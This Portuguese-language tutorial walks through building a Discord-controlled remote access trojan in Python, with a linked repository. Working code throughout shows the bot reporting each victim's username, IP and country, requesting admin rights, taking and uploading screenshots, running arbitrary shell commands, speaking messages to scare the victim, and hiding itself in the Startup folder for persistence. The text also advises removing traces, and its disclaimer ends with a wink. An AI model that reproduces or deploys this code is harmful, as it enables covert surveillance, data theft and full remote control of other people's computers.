# RAT - Remote Administration Tool

RAT é um tipo de malware que permite ao invasor controlar remotamente o computador da vítima. Ele pode capturar imagens da tela, gravar áudio, roubar arquivos e executar comandos no sistema.

Basicamente, um RAT é um Cavalo de Troia de Acesso Remoto, que permite ao invasor ter controle total sobre o sistema infectado. Ou seja, o invasor pode fazer o que quiser no computador da vítima, sem que ela saiba.

## Principais funcionalidades de um RAT

Alguns dos recursos mais comuns de um RAT incluem:

- **Captura de tela:** O RAT pode capturar imagens da tela do computador da vítima, permitindo ao invasor ver o que está sendo exibido na tela.

- **Gravação de áudio:** O RAT pode gravar áudio do microfone do computador da vítima, permitindo ao invasor ouvir conversas e sons no ambiente.

- **Roubo de arquivos:** O RAT pode roubar arquivos do computador da vítima, permitindo ao invasor acessar documentos, fotos, vídeos e outros arquivos pessoais.

- **Execução de comandos:** O RAT pode executar comandos no sistema da vítima, permitindo ao invasor instalar outros malwares, alterar configurações do sistema e realizar outras ações maliciosas.

E hoje vamos criar o nosso próprio RAT simples em Python!

## Como o RAT funciona?

Normalmente para se criar uma conexão remota entre o invasor e a vítima, é necessário que o invasor tenha um servidor que escute por conexões e que a vítima tenha um cliente que se conecte a esse servidor. Mas nesse caso não temos um servidor para isso, mas podemos simular essa conexão usando o discord.

Se você parar para pensar, um bot de discord pode rodar localmente no seu computador e executar comandos os ou sys, o que não acontece se você rodar um bot de discord em um servidor. Foi ai que tive a ideia de criar um bot de discord que executa comandos diretamente no computador, ou seja, se outra pessoa rodar esse bot para mim e eu tiver acesso ao chat do discord, eu posso controlar o computador dela remotamente.

Caso você não tenha uma conta no discord, crie uma em [discord.com](https://discord.com) e crie um servidor para testes.

> **DISCLAIMER:** Esse RAT é apenas para fins educacionais e não deve ser usado para prejudicar outras pessoas. O uso de RATs é ilegal e pode resultar em graves consequências legais. ;)

## Criando o nosso RAT

Bom, primeiramente, essa aula ja tem um repositório no github com o código pronto, então se você deseja ja ver o código do RAT do Maraba, acesse [esse link](https://github.com/gitinspersec/rat)

> **Palavras do Maraba:** "Eu me empolguei um pouco nesse RAT, tem mais de 40 comandos que você pode executar remotamente"

Antes de tudo, aqui esta o template basico para iniciar um RAT com discord.py

```py

import discord
from discord.ext import commands
import ctypes
import sys
import os
import ssl
import asyncio
import platform
import urllib.request
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32gui
from mss import mss

################ HELP FUNCTIONS ################

def isAdmin():
    try:
        return (os.getuid() == 0)
    except AttributeError:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0

def restart_as_admin():
    if not isAdmin():
        executable = sys.executable
        params = ' '.join([f'"{param}"' for param in sys.argv])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", executable, params, None, 1)
        sys.exit()

def volumeup():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    if volume.GetMute() == 1:
        volume.SetMute(0, None)
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)

def volumedown():
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevel(volume.GetVolumeRange()[0], None)

################# END HELP FUNCTIONS #################

################# VARIABLES #################

prefix = "!"
token = 'SEU_TOKEN_AQUI'
bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)
ssl._create_default_https_context = ssl._create_unverified_context
channel_name = None

################# END VARIABLES #################

################# Initialize #################

async def activity():
    while True:
        current_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        window_displayer = discord.Game(f"Visiting: {current_window}")
        await bot.change_presence(status=discord.Status.online, activity=window_displayer)
        await asyncio.sleep(3)

@bot.event
async def on_ready():
    global channel_name

    with urllib.request.urlopen("https://ipinfo.io/json") as url:
        data = json.loads(url.read().decode())
        flag = data['country']
        ip = data['ip']

    user_name = os.getlogin()
    session_name = f"session-{user_name}"
    
    guild = bot.guilds[0]
    existing_channel = discord.utils.get(guild.channels, name=session_name)

    if existing_channel:
        await existing_channel.delete()

    new_channel = await guild.create_text_channel(session_name)
    channel_name = session_name

    is_admin = isAdmin()
    message = (f"@here :white_check_mark: New session opened {session_name} | {platform.system()} "
               f"{platform.release()} |  :flag_{flag.lower()}: | User: {user_name} | IP: {ip}")
    if is_admin:
        message += " | admin!"
    
    await new_channel.send(message)
    
    game = discord.Game(f"Window logging stopped")
    await bot.change_presence(status=discord.Status.online, activity=game)

    bot.loop.create_task(activity())

def split_message(message, limit=2000):
    adjusted_limit = limit - 6
    return [message[i:i+adjusted_limit] for i in range(0, len(message), adjusted_limit)]



@bot.command(name='help', help="Mostra esta mensagem de ajuda.")
async def help(ctx):
    help_message = "Comandos Disponíveis:\n\n"
    for command in bot.commands:
        help_message += f"{prefix}{command.name:<15} -> {command.help}\n"
    parts = split_message(help_message)
    for part in parts:
        await ctx.send(f"```{part}```")

```

Esse é o template basico para iniciar um RAT com discord.py, com esse template você ja pode começar a adicionar comandos e funcionalidades ao seu RAT.

Vamos adicionar alguns comandos para que você possa ter uma ideia de como funciona o RAT

Vamos adicionar um comando que tem o objetivo de capturar a tela do computador da vítima e enviar para o discord.

```py

@bot.command(name='screenshot', help=f'Tira um screenshot da tela e envia para o canal atual. Uso: {prefix}screenshot')
async def screenshot(ctx):
    with mss() as sct:
        sct.shot(output='screenshot.png')
    await ctx.send(file=discord.File('screenshot.png'))
    os.remove('screenshot.png')

```

Esse comando usa a biblioteca `mss` para capturar a tela do computador da vítima e enviar para o discord. O comando cria um arquivo chamado `screenshot.png` e envia para o discord, logo em seguida o arquivo é removido.

**PS: Nunca esqueça de remover os arquivos que você cria, para não deixar rastros**

Vamos adicionar um comando que tem o objetivo de aumentar o volume para o máximo e um para o mínimo.

Pos sorte eu ja implementei as funções `volumeup` e `volumedown` para você, então você só precisa adicionar os comandos.

```py

@bot.command(name='volumeup', help='Aumenta o volume do computador. Uso: !volumeup')
async def volume_up(ctx):
    volumeup()
    await ctx.send("[*] Volume up to 100%")

@bot.command(name='volumedown', help=f'Diminui o volume do computador. Uso: {prefix}volumedown')
async def volume_down(ctx):
    volumedown()
    await ctx.send("[*] Volume down to 0%")

```

Vamos adicionar um commando para "falar" com a vítima, ou seja, o bot vai falar uma mensagem (Imagina o medo que a pessoa vai sentir quando o computador dela começar a falar sozinho)

```py

@bot.command(name='voice', help=f'Fala a mensagem especificada. Uso: {prefix}voice <mensagem>')
async def voice(ctx, *, message: str):
    subprocess.run(f"PowerShell -Command Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')", shell=True)
    await ctx.send(f"[*] Voice message: {message}")

```

Vamos para o comando mais importante, o comando que executa comandos no sistema da vítima.

Para que o virus seja chamado de RAT, ele precisa ter a funcionalidade de executar comandos no sistema da vítima, então vamos adicionar essa funcionalidade ao nosso RAT.

```py

@bot.command(name='shell', help=f'Executa um comando no shell. Uso: {prefix}shell <comando>')
async def shell(ctx, *, command: str):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout if result.stdout else result.stderr
        if output:
            if len(output) > 2000:
                with open("output.txt", "w") as f:
                    f.write(output)
                await ctx.send(file=discord.File("output.txt"))
            else:
                await ctx.send(f"```\n{output}\n```")
        else:
            await ctx.send("[*] Comando executado, mas sem saída.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao executar o comando: {str(e)}")

```

Esse comando executa um comando no shell e envia a saída para o discord. Se a saída for maior que 2000 caracteres, o bot cria um arquivo chamado `output.txt` e envia para o discord.

Com isso, você ja tem um RAT simples em Python que pode ser usado para controlar remotamente o computador da vítima. Vou apenas fazer mais um comando super importante para que nunca se perca o controle do computador da vítima.

```py

@bot.command(name='startup', help=f'Se coloca para iniciar com o sistema e coloca o atributo de oculto. Uso: {prefix}startup')
async def startup(ctx):
    try:
        bot_path = sys.argv[0]
        bot_name = os.path.basename(bot_path)
        startup_path_en = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bot_name)
        startup_path_pt = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Menu Iniciar', 'Programas', 'Inicializar', bot_name)
        if os.path.exists(startup_path_en):
            startup_path = startup_path_en
        elif os.path.exists(startup_path_pt):
            startup_path = startup_path_pt
        else:
            await ctx.send("[!] Pasta de inicialização não encontrada.")
            return
        shutil.copy(bot_path, startup_path)
        subprocess.run(f"attrib +s +h \"{startup_path}\"", shell=True)
        await ctx.send("[*] Bot configurado para iniciar com o sistema e oculto.")
    except Exception as e:
        await ctx.send(f"[!] Ocorreu um erro ao configurar o bot para iniciar com o sistema: {str(e)}")

```

Esse comando coloca o bot para iniciar com o sistema e coloca o atributo de oculto, ou seja, o bot vai iniciar com o sistema e vai ser oculto, ou seja, a vítima não vai ver que o bot esta rodando.

Bom, a aula em si acaba por aqui, mas vou passar pelo código completo do RAT para que você possa ver como ficou.

Caso tenha algum erro, aqui estao todos os importes que eu usei no RAT

```py
import discord
from discord.ext import commands
import ctypes
import sys
import os
import ssl
import asyncio
import platform
import urllib.request
import json
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import win32gui
from mss import mss
import cv2
import subprocess
import pyautogui as pag
import sqlite3
import webbrowser
import win32crypt
import json
import sounddevice as sd
from scipy.io.wavfile import write
import requests
import psutil
import shutil
```